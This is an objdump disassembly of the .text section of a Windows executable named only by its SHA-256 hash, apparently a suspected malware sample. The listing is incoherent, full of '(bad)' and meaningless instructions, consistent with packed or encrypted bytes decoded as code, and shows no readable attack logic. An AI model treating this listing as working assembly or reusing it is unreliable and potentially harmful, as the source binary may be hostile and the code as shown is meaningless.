
8e239fca87844e927d61c3492d1e87d2154496df50815964f8018d231291bb6d.exe:     file format pei-i386


Disassembly of section .text:

00411000 <.text>:
  411000:	add    dh,BYTE PTR [eax]
  411002:	jbe    0x410fb8
  411004:	stos   DWORD PTR es:[edi],eax
  411005:	fwait
  411006:	push   cs
  411007:	cli    
  411008:	push   esp
  411009:	shl    BYTE PTR [esi],cl
  41100b:	lock sub al,BYTE PTR [edx+0x168b2848]
  411012:	fsub   QWORD PTR [edi+0x778066a0]
  411018:	dec    ecx
  411019:	sbb    ebp,esi
  41101b:	or     BYTE PTR [esi+0x42],ah
  41101e:	ret    
  41101f:	outs   dx,BYTE PTR ds:[esi]
  411020:	inc    ecx
  411021:	in     al,dx
  411022:	mov    bh,0x2c
  411024:	lds    edi,FWORD PTR [ecx-0x6e]
  411027:	mov    esp,0x72cf36ca
  41102c:	or     BYTE PTR [esi],ah
  41102e:	fnsave [eax+0x75]
  411031:	enter  0xde0e,0xf
  411035:	xor    DWORD PTR [esi+0x11],ebx
  411038:	fwait
  411039:	jp     0x410fd2
  41103b:	push   ecx
  41103c:	sub    eax,0xe7236784
  411041:	cmp    al,0x5d
  411043:	inc    edx
  411044:	(bad)  
  411045:	push   0xffffffe6
  411047:	mov    edi,0xbd0c9503
  41104c:	xlat   BYTE PTR ds:[ebx]
  41104d:	mov    edi,0x18abc1db
  411052:	arpl   WORD PTR [ebx],ax
  411054:	fcomp  QWORD PTR [eax]
  411056:	add    dh,al
  411058:	in     al,dx
  411059:	int3   
  41105a:	shl    cl,1
  41105c:	xor    ah,BYTE PTR [ecx-0x4aceac7e]
  411062:	jno    0x4110c6
  411064:	loop   0x4110c8
  411066:	dec    ebp
  411067:	cmp    eax,0x8b2c3b78
  41106c:	add    eax,0xf5c84a6c
  411071:	inc    eax
  411072:	xchg   DWORD PTR [esi-0x26],ecx
  411075:	loope  0x4110e5
  411077:	dec    edi
  411079:	fadd   DWORD PTR [ebx-0x26]
  41107c:	mov    bl,0xbd
  41107e:	or     al,0xbd
  411080:	in     al,dx
  411081:	cs cs lahf 
  411084:	xchg   ebx,eax
  411085:	mov    eax,ds:0xaefd456b
  41108a:	sbb    eax,0x7b03b5ac
  41108f:	aaa    
  411090:	inc    esi
  411091:	push   edx
  411092:	rol    BYTE PTR [esp+ebx*1],1
  411095:	push   ds
  411096:	mov    al,0x95
  411098:	push   eax
  411099:	stc    
  41109a:	add    eax,DWORD PTR [esp+edx*2-0x37ec0046]
  4110a1:	fwait
  4110a2:	adc    ah,BYTE PTR [ecx-0x7d]
  4110a5:	dec    esp
  4110a6:	mov    WORD PTR [edx],ss
  4110a8:	dec    ecx
  4110a9:	jle    0x4110a2
  4110ab:	dec    eax
  4110ac:	xchg   edx,eax
  4110ad:	jb     0x411087
  4110af:	jle    0x4110ed
  4110b1:	clc    
  4110b2:	push   ss
  4110b3:	add    BYTE PTR [ecx+0x19],bl
  4110b6:	ficom  WORD PTR [eax]
  4110b8:	ror    bh,cl
  4110ba:	jno    0x411110
  4110bc:	ja     0x411112
  4110be:	in     al,0xb0
  4110c0:	xchg   ebp,eax
  4110c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4110c2:	in     al,0x90
  4110c4:	stc    
  4110c5:	cwde   
  4110c6:	ins    BYTE PTR es:[edi],dx
  4110c7:	das    
  4110c8:	icebp  
  4110c9:	sbb    eax,0x1b76a00f
  4110ce:	add    al,0x8f
  4110d0:	cmp    ecx,DWORD PTR [edx]
  4110d2:	pop    edx
  4110d3:	mov    dh,0xec
  4110d5:	sub    ebx,DWORD PTR [eax+0x2bbfc4bb]
  4110db:	lock mov edx,0xb8e68a6d
  4110e1:	sub    al,0x62
  4110e3:	aaa    
  4110e4:	sub    eax,0x7e8f5ea9
  4110e9:	fst    st(2)
  4110eb:	stos   DWORD PTR es:[edi],eax
  4110ec:	pusha  
  4110ed:	fmul   DWORD PTR [esi+0x58f3728a]
  4110f3:	imul   ebx,DWORD PTR [edx-0x180d23cc],0x30d8aed9
  4110fd:	imul   ecx,DWORD PTR [ebp-0x6f831463],0xc0453cc4
  411107:	pop    edi
  411108:	ret    0xadd
  41110b:	xor    al,0x88
  41110d:	inc    esi
  41110e:	hlt    
  41110f:	cmc    
  411110:	jae    0x411118
  411112:	test   al,0x10
  411114:	cld    
  411115:	and    ebp,edi
  411117:	sub    edi,0x8a8129cd
  41111d:	mov    esp,0xae03753
  411122:	ret    
  411123:	jle    0x4110b0
  411125:	sub    eax,0x79208
  41112a:	mov    ds:0x1fd4332,al
  41112f:	push   eax
  411130:	ds out dx,al
  411132:	adc    eax,0x2ac6f597
  411137:	adc    al,0x83
  411139:	mov    cl,0x92
  41113b:	fidivr DWORD PTR [edx-0x59]
  41113e:	sub    BYTE PTR [ecx*4+0x798e543],ch
  411145:	cmp    DWORD PTR [esi+ecx*2],ebp
  411148:	sub    BYTE PTR [edx-0x67],0x47
  41114c:	mov    ?,WORD PTR [ecx-0x2749add6]
  411152:	fmul   QWORD PTR [edx-0x40cdde27]
  411158:	xchg   edx,eax
  411159:	bound  esp,QWORD PTR [ecx-0x2c]
  41115c:	out    dx,eax
  41115d:	push   es
  41115e:	out    0x67,al
  411160:	inc    edi
  411161:	scas   al,BYTE PTR es:[edi]
  411162:	ins    BYTE PTR es:[edi],dx
  411163:	imul   BYTE PTR [ebx+0x53a36645]
  411169:	(bad)  
  41116a:	pop    ebx
  41116b:	sbb    eax,0x2ae34ef7
  411170:	xor    eax,0x37d9007c
  411175:	fstp   QWORD PTR [eax-0x8]
  411178:	and    BYTE PTR [esi-0x19],bl
  41117b:	jo     0x41111a
  41117d:	mov    esp,0xa0688fb6
  411182:	xchg   esp,eax
  411183:	ins    BYTE PTR es:[edi],dx
  411184:	cmp    ch,BYTE PTR [edi-0x6dfdbd00]
  41118a:	jns    0x411209
  41118c:	or     BYTE PTR [ebp-0x15],cl
  41118f:	cmp    al,0xcb
  411191:	mov    dh,0xab
  411193:	and    BYTE PTR [edi-0x56],dl
  411196:	sub    esp,DWORD PTR [ebx-0x5]
  411199:	add    DWORD PTR [ebp+0x44086015],edx
  41119f:	fld    TBYTE PTR [eax+esi*8+0x43]
  4111a3:	out    0xe3,eax
  4111a5:	push   esi
  4111a6:	add    ebx,DWORD PTR [edi]
  4111a8:	jmp    0x4111bc
  4111aa:	jmp    0x275c:0xa025fcff
  4111b1:	shr    BYTE PTR [edi-0x44b5a89c],cl
  4111b7:	xchg   edx,eax
  4111b8:	adc    ecx,DWORD PTR [ebp-0x20]
  4111bb:	fdiv   QWORD PTR [eax+ebx*2-0x6d]
  4111bf:	inc    ebp
  4111c0:	add    BYTE PTR [eax],dh
  4111c2:	ja     0x4111f2
  4111c4:	jno    0x411217
  4111c6:	imul   ebx,DWORD PTR [esi-0x38],0x78ee3f3b
  4111cd:	xchg   DWORD PTR [eax-0x3f19519d],esp
  4111d3:	es add eax,0xb31c750c
  4111d9:	jno    0x4111be
  4111db:	pop    es
  4111dc:	fadd   DWORD PTR [eax-0x26]
  4111df:	jmp    0xfe4804d1
  4111e4:	push   eax
  4111e5:	pop    edi
  4111e6:	aaa    
  4111e7:	stos   BYTE PTR es:[edi],al
  4111e8:	dec    edi
  4111e9:	cld    
  4111ea:	mov    eax,ds:0xcacd8b14
  4111ef:	fidivr DWORD PTR [ecx-0x2f00974d]
  4111f5:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  4111f7:	or     ch,bl
  4111f9:	fs push esp
  4111fb:	mov    ch,0x3c
  4111fd:	test   eax,0x6b1b63a9
  411202:	cmp    eax,0xc96ae973
  411207:	in     al,dx
  411208:	ficomp DWORD PTR [edi+0x7c]
  41120b:	in     al,dx
  41120c:	mov    ecx,DWORD PTR [ebp+0x33f8a732]
  411212:	add    DWORD PTR [edi-0x241ce9e7],esp
  411218:	dec    ebp
  411219:	es pushf 
  41121b:	and    dl,BYTE PTR [eax-0x70]
  41121e:	in     eax,dx
  41121f:	mov    ch,al
  411221:	cmp    dl,BYTE PTR [ecx]
  411223:	lahf   
  411224:	xor    DWORD PTR [ebx+edi*8-0x28a36d26],0x4e
  41122c:	pushf  
  41122d:	sub    esi,DWORD PTR [ecx]
  41122f:	stos   BYTE PTR es:[edi],al
  411230:	ficomp WORD PTR [edi]
  411232:	shl    BYTE PTR [eax-0x16e47531],cl
  411238:	cli    
  411239:	out    0x9c,al
  41123b:	stos   BYTE PTR es:[edi],al
  41123c:	imul   eax,DWORD PTR [ebp-0xb3d37e5],0x9f90c2c8
  411246:	xchg   ebx,eax
  411247:	(bad)  
  411248:	neg    ch
  41124a:	cwde   
  41124b:	mov    eax,0xfa53b87d
  411250:	push   ecx
  411251:	sbb    ecx,eax
  411253:	and    bl,BYTE PTR [edx+edx*1]
  411256:	aad    0xa8
  411258:	push   edx
  411259:	(bad)  
  41125b:	in     al,0x6d
  41125d:	clc    
  41125e:	adc    DWORD PTR [eax+edx*4+0x6e],ebp
  411262:	mov    BYTE PTR [ebp+0x17],cl
  411265:	jl     0x4112b4
  411267:	repz push cs
  411269:	in     al,0xe
  41126b:	push   esp
  41126c:	lods   eax,DWORD PTR ds:[esi]
  41126d:	pop    ebp
  41126e:	gs push 0x7f
  411271:	call   0x60a5:0xfaf6e1b0
  411278:	xor    BYTE PTR [ebp-0x46743152],ch
  41127e:	cmp    eax,0xb78e6b4d
  411283:	add    al,0xef
  411285:	sti    
  411286:	test   ebp,edx
  411288:	push   ebx
  411289:	and    DWORD PTR [ecx+0x10],ebp
  41128c:	mov    ch,0xf0
  41128e:	mov    dl,0x14
  411290:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411291:	pop    edx
  411292:	mov    BYTE PTR [ecx-0x77],dl
  411295:	icebp  
  411296:	mov    dh,0x38
  411298:	mov    ah,BYTE PTR [eax]
  41129a:	mov    ecx,0xa41312dd
  41129f:	das    
  4112a0:	and    ch,dl
  4112a2:	and    DWORD PTR [ebx],ebp
  4112a4:	shl    BYTE PTR [esi-0x38],0x92
  4112a8:	dec    esp
  4112a9:	ins    DWORD PTR es:[edi],dx
  4112aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4112ab:	mov    ebx,0xbe9e1a8a
  4112b0:	imul   esp,DWORD PTR [eax],0x5a
  4112b3:	adc    ebp,DWORD PTR [edx+0xb]
  4112b6:	mov    ah,0x5a
  4112b8:	int    0x85
  4112ba:	repnz adc DWORD PTR [edi],eax
  4112bd:	add    BYTE PTR [ebx],0x9d
  4112c0:	pop    esp
  4112c1:	imul   DWORD PTR [edx]
  4112c3:	push   0xba49cbd8
  4112c8:	mov    bh,0x99
  4112ca:	ret    
  4112cb:	xor    al,0x42
  4112cd:	out    dx,eax
  4112ce:	cmp    ebx,ecx
  4112d0:	loopne 0x4112f7
  4112d2:	or     BYTE PTR [eax-0x2c9a1a79],ch
  4112d8:	shl    DWORD PTR [edx+0x62],1
  4112db:	addr16 loop 0x4112c2
  4112de:	sub    DWORD PTR [eax+eiz*2+0x75],ecx
  4112e2:	jbe    0x411313
  4112e4:	inc    ebp
  4112e5:	push   es
  4112e6:	and    dh,BYTE PTR [edi+0x59]
  4112e9:	fwait
  4112ea:	(bad)  
  4112ec:	test   al,0x22
  4112ee:	jg     0x411287
  4112f0:	(bad)  
  4112f1:	mov    ecx,0x24339914
  4112f6:	lds    esi,FWORD PTR [edi+edi*2-0x75]
  4112fa:	lahf   
  4112fb:	jg     0x411329
  4112fd:	test   BYTE PTR [ebx+0x49acfb6c],dh
  411303:	xchg   ebx,eax
  411304:	ror    DWORD PTR [edx],1
  411306:	das    
  411307:	adc    ebx,esp
  411309:	loopne 0x411339
  41130b:	sub    bl,BYTE PTR [ecx]
  41130d:	sub    DWORD PTR [eax-0x3a],edi
  411310:	(bad)  
  411311:	xor    esi,ecx
  411313:	cmp    bl,BYTE PTR [esi]
  411315:	xchg   esp,eax
  411316:	mov    bh,0x64
  411318:	push   ss
  411319:	dec    ebp
  41131a:	inc    ebx
  41131b:	aad    0xf2
  41131d:	mov    esi,0x8b9b67b3
  411322:	dec    BYTE PTR [edx]
  411324:	call   0x1ac11342
  411329:	popa   
  41132a:	mov    bl,0x8
  41132c:	adc    BYTE PTR [eax+0x7c],ah
  41132f:	retf   0xcc72
  411332:	out    0xa1,eax
  411334:	mov    bh,0xbd
  411336:	push   cs
  411337:	dec    eax
  411338:	xor    al,0x2f
  41133a:	adc    al,0x44
  41133c:	adc    al,0xc8
  41133e:	and    al,0xc1
  411340:	call   0xaaa1:0x23c2b02b
  411347:	ins    DWORD PTR es:[edi],dx
  411348:	retf   0x10e9
  41134b:	sbb    ch,BYTE PTR [edx]
  41134d:	in     al,dx
  41134e:	call   0x1175283c
  411353:	into   
  411354:	outs   dx,DWORD PTR ds:[esi]
  411355:	ds popa 
  411357:	outs   dx,BYTE PTR ds:[esi]
  411358:	sub    BYTE PTR [eax],bh
  41135a:	aam    0x72
  41135c:	repz jne 0x411321
  41135f:	jge    0x4113db
  411361:	cli    
  411362:	fwait
  411363:	inc    esp
  411364:	ret    0x7dd7
  411367:	jmp    0x5ed0cbe6
  41136c:	scas   al,BYTE PTR es:[edi]
  41136d:	les    edx,FWORD PTR [edi+0x6ffe7fd7]
  411373:	pop    eax
  411374:	xor    DWORD PTR [esi],esi
  411376:	jb     0x411348
  411378:	mov    ah,0x5d
  41137a:	dec    esi
  41137b:	mov    bh,0x3d
  41137d:	test   al,dl
  41137f:	jmp    0xe9384504
  411384:	cmp    eax,0x759b0b8
  411389:	xchg   ebp,eax
  41138a:	xor    ebp,ecx
  41138c:	pop    ebp
  41138d:	mov    edi,0xee5e6288
  411392:	dec    edx
  411393:	mov    esi,0xf56f2fde
  411398:	and    al,BYTE PTR [ecx-0x7c]
  41139b:	push   edi
  41139c:	in     eax,0x52
  41139e:	mov    ah,0x95
  4113a0:	push   ebp
  4113a1:	gs xor bh,cl
  4113a4:	cmp    edx,DWORD PTR [esi-0x10bb8da3]
  4113aa:	test   eax,0x876b8d37
  4113af:	clc    
  4113b0:	adc    ch,cl
  4113b2:	std    
  4113b3:	imul   esp,DWORD PTR [edx-0x691e0578],0xa3ff001d
  4113bd:	mov    ecx,0x3cd0fa2d
  4113c2:	mov    DWORD PTR [esi],ecx
  4113c4:	inc    ebx
  4113c5:	xor    BYTE PTR [edx],bh
  4113c7:	add    DWORD PTR [ecx+0x2a],ecx
  4113ca:	fs xchg ebx,eax
  4113cc:	stc    
  4113cd:	call   0xafb2:0x7d1ea6dc
  4113d4:	gs dec esi
  4113d6:	cmp    esi,ecx
  4113d8:	inc    ecx
  4113d9:	sbb    DWORD PTR [edi],edx
  4113db:	and    esp,DWORD PTR [edx+0x76]
  4113de:	inc    esp
  4113df:	in     al,0xae
  4113e1:	mov    ebx,0xe7628b88
  4113e6:	loop   0x41140c
  4113e8:	ret    
  4113e9:	dec    edx
  4113ea:	sbb    dh,BYTE PTR [edi-0x207df606]
  4113f0:	nop
  4113f1:	js     0x4113b4
  4113f3:	cmp    al,0x9
  4113f5:	push   ds
  4113f6:	ffreep st(5)
  4113f9:	jno    0x411406
  4113fb:	cwde   
  4113fc:	xor    edi,esi
  4113fe:	inc    edx
  4113ff:	call   0x931d63a4
  411404:	rcr    dl,0xb1
  411407:	or     eax,edx
  411409:	lods   al,BYTE PTR ds:[esi]
  41140a:	adc    BYTE PTR [ebx+0x51b6fc3c],bh
  411410:	das    
  411411:	xor    eax,0x5094759b
  411416:	bound  ebp,QWORD PTR [edi+eiz*2+0x3d]
  41141a:	int    0x87
  41141c:	imul   ebp,DWORD PTR [edx+0x18],0xffffffe1
  411420:	(bad)  
  411422:	lock out dx,al
  411424:	test   eax,0x9aac0349
  411429:	test   DWORD PTR [edx],edx
  41142b:	ror    cl,1
  41142d:	inc    ecx
  41142e:	pop    ds
  41142f:	mov    esp,0x91570ff4
  411434:	ror    BYTE PTR [esi-0x30],1
  411437:	sub    esp,ecx
  411439:	ret    0x47b4
  41143c:	std    
  41143d:	iret   
  41143e:	cmp    DWORD PTR [edx-0x6f70975b],esi
  411444:	dec    eax
  411445:	sbb    bl,BYTE PTR [eax+edi*2+0x3996e557]
  41144c:	mov    ebx,0x9c8a5fd2
  411451:	pop    esp
  411453:	mov    dl,0xad
  411455:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411456:	inc    esp
  411457:	dec    esi
  411458:	les    ebp,FWORD PTR [esi+0x526e07d0]
  41145e:	mov    ds:0x1a005618,eax
  411463:	hlt    
  411464:	lock fdiv QWORD PTR [ebx+0x38]
  411468:	dec    edi
  411469:	into   
  41146a:	mov    ecx,0x6ac7b688
  41146f:	scas   al,BYTE PTR es:[edi]
  411470:	jg     0x4114a3
  411472:	cwde   
  411473:	xor    DWORD PTR [edx-0x37],ebp
  411476:	call   0xea89dc69
  41147b:	sub    esi,edi
  41147d:	fst    st(3)
  41147f:	adc    BYTE PTR [edx+0x2ee09b20],dh
  411485:	sub    dl,0xfd
  411488:	jo     0x4114f6
  41148a:	cwde   
  41148b:	sub    al,0x20
  41148d:	call   0x8352:0xe48679e9
  411494:	ins    DWORD PTR es:[edi],dx
  411495:	or     ah,BYTE PTR cs:[ebx-0x295cd96]
  41149c:	pop    eax
  41149d:	loope  0x411504
  41149f:	js     0x411475
  4114a1:	mov    ebp,0x9e39470d
  4114a6:	shr    BYTE PTR [ebp+0x7c007949],0xd0
  4114ad:	fst    DWORD PTR [edx-0x58]
  4114b0:	sub    eax,0xb0fb16d7
  4114b5:	sar    BYTE PTR [ebx],1
  4114b7:	add    al,0x12
  4114b9:	mov    eax,ecx
  4114bb:	jl     0x41149a
  4114bd:	pop    es
  4114be:	scas   al,BYTE PTR es:[edi]
  4114bf:	mov    esp,0xb7a746a3
  4114c4:	repnz push esi
  4114c6:	bswap  ebp
  4114c8:	pop    edi
  4114c9:	sub    BYTE PTR ds:0xd530627d,al
  4114cf:	inc    ebp
  4114d0:	enter  0xe8e5,0x56
  4114d4:	int    0x73
  4114d6:	xchg   ebx,eax
  4114d7:	cmp    al,0x2e
  4114d9:	and    DWORD PTR [ecx-0x6114f7e1],edi
  4114df:	std    
  4114e0:	or     ecx,DWORD PTR [eax]
  4114e2:	xchg   edx,eax
  4114e3:	mov    bh,0x10
  4114e5:	mov    dl,0x3e
  4114e7:	pop    edi
  4114e8:	or     cl,BYTE PTR [ecx-0xdccd9f3]
  4114ee:	inc    eax
  4114ef:	mov    esp,0xfeb5d009
  4114f4:	std    
  4114f5:	(bad)  
  4114f6:	leave  
  4114f7:	push   ebx
  4114f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4114f9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4114fa:	fs fxch st(5)
  4114fd:	jo     0x41153e
  4114ff:	cmp    DWORD PTR [edi],0x320eb6d2
  411505:	pop    ebp
  411506:	adc    al,0x9
  411508:	loop   0x41154c
  41150a:	cld    
  41150b:	addr16 in eax,0x2b
  41150e:	bound  edi,QWORD PTR [edx+0x6a]
  411511:	adc    al,0x85
  411513:	pusha  
  411514:	and    esp,DWORD PTR ds:0xec8205d1
  41151a:	cwde   
  41151b:	call   0x1da6d8e0
  411520:	inc    esp
  411521:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411522:	loopne 0x41152b
  411524:	cmp    edx,0x35fbee2
  41152a:	or     ebx,DWORD PTR [edx-0x8471648]
  411530:	lods   eax,DWORD PTR ds:[esi]
  411531:	dec    eax
  411532:	int3   
  411533:	dec    esi
  411534:	xchg   edi,eax
  411535:	xlat   BYTE PTR ds:[ebx]
  411536:	pop    esi
  411537:	pusha  
  411538:	add    eax,0xfeb4b4ab
  41153d:	arpl   bp,ax
  41153f:	fcom   QWORD PTR ds:0xae2e0c18
  411545:	pushf  
  411546:	xchg   DWORD PTR [edx+0x7ba19a42],eax
  41154c:	mov    DWORD PTR [ecx+0x50417207],eax
  411552:	mov    ds:0xdc67fa62,eax
  411557:	mov    dh,0xc1
  411559:	repz pop ds
  41155b:	ja     0x41155d
  41155d:	aad    0xf
  41155f:	dec    eax
  411560:	lods   al,BYTE PTR ds:[esi]
  411561:	dec    edx
  411562:	test   al,0x6f
  411564:	int    0xf5
  411566:	pop    ebx
  411567:	int3   
  411568:	aas    
  411569:	xchg   edi,eax
  41156a:	and    al,0x32
  41156c:	(bad)
  41156f:	mov    al,0xcc
  411571:	pusha  
  411572:	in     eax,dx
  411573:	lock or bh,dh
  411576:	mov    dh,ch
  411578:	push   cs
  411579:	xor    eax,0x6ff3cce6
  41157e:	icebp  
  41157f:	imul   eax,DWORD PTR [eax+edi*2+0x492708ce],0x25
  411587:	mov    edx,0x239381ef
  41158c:	hlt    
  41158d:	in     eax,dx
  41158e:	aad    0x31
  411590:	or     BYTE PTR [ebx],0xcb
  411593:	repnz and edx,ebx
  411596:	adc    DWORD PTR [ebp+0xd],esi
  411599:	inc    eax
  41159a:	in     al,dx
  41159b:	inc    ebp
  41159c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41159d:	dec    edx
  41159e:	and    eax,0x92d15ed7
  4115a3:	js     0x411574
  4115a5:	mov    bh,0x13
  4115a7:	xacquire xchg BYTE PTR [edi-0xe41ac55],al
  4115ae:	repnz mov ds:0x9069dfaf,al
  4115b4:	sahf   
  4115b5:	or     DWORD PTR [ebp-0x26],esp
  4115b8:	push   ds
  4115b9:	mov    DWORD PTR [ebx+0x72e3b66e],ebp
  4115bf:	dec    ebp
  4115c0:	fsub   QWORD PTR ss:[esi-0x41e4524d]
  4115c7:	adc    dh,bl
  4115c9:	mov    edi,0xde61d317
  4115ce:	push   cs
  4115cf:	sub    eax,0xb1e3d548
  4115d4:	das    
  4115d5:	sbb    BYTE PTR [edx-0x66],dl
  4115d8:	out    dx,al
  4115d9:	repz mov ah,0xb1
  4115dc:	xor    cl,bh
  4115de:	rcl    BYTE PTR [ebp-0x642b2147],1
  4115e4:	add    ch,0x73
  4115e7:	push   eax
  4115e8:	jg     0x41160a
  4115ea:	call   0x2af9850a
  4115ef:	stos   BYTE PTR es:[edi],al
  4115f0:	inc    ecx
  4115f1:	cmp    eax,0xf8df88d7
  4115f6:	jl     0x411605
  4115f8:	mov    cl,0x9
  4115fa:	jg     0x411584
  4115fc:	daa    
  4115fd:	scas   eax,DWORD PTR es:[edi]
  4115fe:	push   ecx
  4115ff:	xchg   edx,eax
  411600:	fs xchg ebx,eax
  411602:	out    dx,al
  411603:	pop    ebp
  411604:	ins    BYTE PTR es:[edi],dx
  411605:	push   ss
  411606:	dec    esp
  411607:	push   edi
  411608:	mov    gs,WORD PTR [esi+0x66ea1f60]
  41160e:	jbe    0x411655
  411610:	cwde   
  411611:	scas   eax,DWORD PTR es:[edi]
  411612:	push   eax
  411613:	xchg   al,ch
  411615:	jge    0x4115dd
  411617:	add    BYTE PTR ds:0x7973aa48,cl
  41161d:	and    edx,DWORD PTR [esi+0x7bae6e2b]
  411623:	stos   BYTE PTR es:[edi],al
  411624:	cli    
  411625:	jle    0x4115c2
  411627:	cmp    al,0x67
  411629:	adc    ch,BYTE PTR [ecx]
  41162b:	imul   eax,DWORD PTR [edx+eiz*1-0x6eeb2884],0x36
  411633:	fadd   st(1),st
  411635:	adc    al,0xfa
  411637:	in     al,dx
  411638:	jbe    0x4115da
  41163a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41163b:	out    dx,eax
  41163c:	fstp   DWORD PTR [ebx-0x10]
  41163f:	inc    edi
  411640:	clc    
  411641:	ja     0x41161e
  411643:	cli    
  411644:	lods   al,BYTE PTR ds:[esi]
  411645:	loop   0x41161a
  411647:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411648:	dec    esi
  411649:	inc    edi
  41164a:	pushf  
  41164b:	or     al,0xb
  41164d:	out    0x8,al
  41164f:	jae    0x4115e1
  411651:	lods   al,BYTE PTR ds:[esi]
  411652:	jle    0x411652
  411654:	mov    ah,0xad
  411656:	daa    
  411657:	dec    ecx
  411658:	dec    BYTE PTR [eax]
  41165a:	fsub   DWORD PTR [eax-0x3f03a10b]
  411660:	sub    al,0x26
  411662:	adc    eax,0x1e4b44a2
  411667:	xor    al,0x82
  411669:	pop    ebp
  41166a:	cmp    cl,0x45
  41166d:	sbb    eax,0x8353d626
  411672:	in     al,0xd4
  411674:	out    dx,eax
  411675:	daa    
  411676:	sub    dl,dh
  411678:	loop   0x41168c
  41167a:	test   DWORD PTR [ebp+0x3d2e62fd],eax
  411680:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411681:	lods   eax,DWORD PTR ds:[esi]
  411682:	outs   dx,DWORD PTR ds:[esi]
  411683:	in     eax,dx
  411684:	pop    ecx
  411685:	fwait
  411686:	inc    esp
  411687:	(bad)  
  411688:	and    ebx,DWORD PTR ds:0xfbf47486
  41168e:	xor    al,0xfd
  411690:	mov    ebx,0x95f04ced
  411695:	xchg   edi,eax
  411696:	arpl   WORD PTR [ebp-0x354260b2],sp
  41169c:	inc    esi
  41169d:	or     edi,DWORD PTR [ebx-0x7f7bdfe3]
  4116a3:	mov    ecx,0xa6394d44
  4116a8:	mov    al,0xe9
  4116aa:	jl     0x41169b
  4116ac:	lock lds eax,FWORD PTR [ecx+0x2]
  4116b0:	sbb    DWORD PTR [edi+edi*1+0x10],0x3b
  4116b5:	test   DWORD PTR [edi],ebp
  4116b7:	or     eax,0xb2bddcc1
  4116bc:	outs   dx,BYTE PTR ds:[esi]
  4116bd:	xchg   ebp,eax
  4116be:	enter  0x903f,0xef
  4116c2:	fmulp  st(5),st
  4116c4:	dec    eax
  4116c5:	add    BYTE PTR [ecx+esi*2],ch
  4116c8:	push   edi
  4116c9:	rcr    DWORD PTR [ebx+0x59827404],cl
  4116cf:	lods   eax,DWORD PTR ds:[esi]
  4116d0:	push   esi
  4116d1:	mov    edi,ecx
  4116d3:	arpl   WORD PTR [edx-0x20],dx
  4116d6:	cmp    bh,BYTE PTR [edx+0x2b230117]
  4116dc:	pushf  
  4116dd:	xor    ebx,eax
  4116df:	push   ebx
  4116e0:	sbb    ah,BYTE PTR [edx-0x5ca4042a]
  4116e6:	push   ds
  4116e7:	xor    edi,ebx
  4116e9:	fisub  DWORD PTR [ebx]
  4116eb:	cmp    eax,0x46342b0
  4116f0:	aas    
  4116f1:	dec    edx
  4116f2:	sub    DWORD PTR [eax+0x41],0xffffffb7
  4116f6:	clc    
  4116f7:	sub    ecx,DWORD PTR [ebp+ebp*1+0xf]
  4116fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4116fc:	pop    esi
  4116fd:	lods   al,BYTE PTR ds:[esi]
  4116fe:	push   ebp
  4116ff:	and    DWORD PTR [ebp+0x37],edi
  411702:	xor    ebp,DWORD PTR [edi+edx*4-0x33]
  411706:	retf   0x905d
  411709:	ror    DWORD PTR [edx],cl
  41170b:	xor    cl,BYTE PTR [ebp+0x57885603]
  411711:	jecxz  0x41175b
  411713:	fadd   st(4),st
  411715:	adc    ebx,DWORD PTR [edx]
  411717:	ror    DWORD PTR [eax+edi*4-0x37],1
  41171b:	ret    
  41171c:	jp     0x4116db
  41171e:	shl    DWORD PTR [edi+0x26cbbff8],cl
  411724:	mov    al,ds:0xaeb2f1e5
  411729:	inc    edi
  41172a:	(bad)  
  41172b:	ins    BYTE PTR es:[edi],dx
  41172c:	push   ecx
  41172d:	xchg   ebp,eax
  41172e:	pop    edx
  41172f:	fisttp QWORD PTR [ebx]
  411731:	push   0x97257fbe
  411736:	jo     0x411721
  411738:	cmp    BYTE PTR [ebx],al
  41173a:	xor    dh,BYTE PTR [edx]
  41173c:	sub    DWORD PTR [ebx+0x38b4f1f5],edx
  411742:	mov    esp,DWORD PTR [ebx]
  411744:	pop    ebx
  411745:	stc    
  411746:	jnp    0x4117ac
  411748:	fmul   st,st(0)
  41174a:	retf   0x1299
  41174d:	push   ss
  41174e:	xchg   ecx,eax
  41174f:	jnp    0x411745
  411751:	in     al,0x45
  411753:	pop    ecx
  411754:	or     eax,0xbc491764
  411759:	pushf  
  41175a:	push   esi
  41175b:	in     eax,dx
  41175c:	cmp    al,0x1a
  41175e:	mov    ds:0x5a026271,al
  411763:	call   0xa91c:0x814c49ac
  41176a:	cwde   
  41176b:	ss pop eax
  41176d:	out    0xbb,al
  41176f:	or     eax,0x7eef8cc5
  411774:	scas   eax,DWORD PTR es:[edi]
  411775:	outs   dx,BYTE PTR ds:[esi]
  411776:	int    0xe2
  411778:	xchg   esp,eax
  411779:	mov    bl,0x32
  41177b:	cmp    BYTE PTR [ebp-0x725e88aa],dh
  411781:	and    eax,0xb24b4dbb
  411786:	iret   
  411787:	push   ecx
  411788:	pop    esi
  411789:	inc    esi
  41178a:	sti    
  41178b:	ficomp WORD PTR [ecx]
  41178d:	xor    eax,DWORD PTR [esi-0x57]
  411790:	pop    edx
  411791:	and    ebx,DWORD PTR [edi+0x186ac66d]
  411797:	xor    eax,0x138920ac
  41179c:	add    BYTE PTR [esi+0x1f316dcf],dl
  4117a2:	jb     0x4117f8
  4117a4:	call   0x34114034
  4117a9:	ins    BYTE PTR es:[edi],dx
  4117aa:	mov    bh,0xdc
  4117ac:	in     al,dx
  4117ad:	push   esp
  4117ae:	xrelease mov DWORD PTR [ebp+0x2d],edx
  4117b2:	mov    dh,0xcd
  4117b4:	(bad)  [edx+esi*1+0x33]
  4117b8:	mov    ebx,0xa54d3686
  4117bd:	jbe    0x4117a1
  4117bf:	xor    bh,cl
  4117c1:	fdivr  st(4),st
  4117c3:	scas   al,BYTE PTR es:[edi]
  4117c4:	pop    ebx
  4117c5:	(bad)  
  4117c6:	jno    0x411832
  4117c8:	ja     0x411821
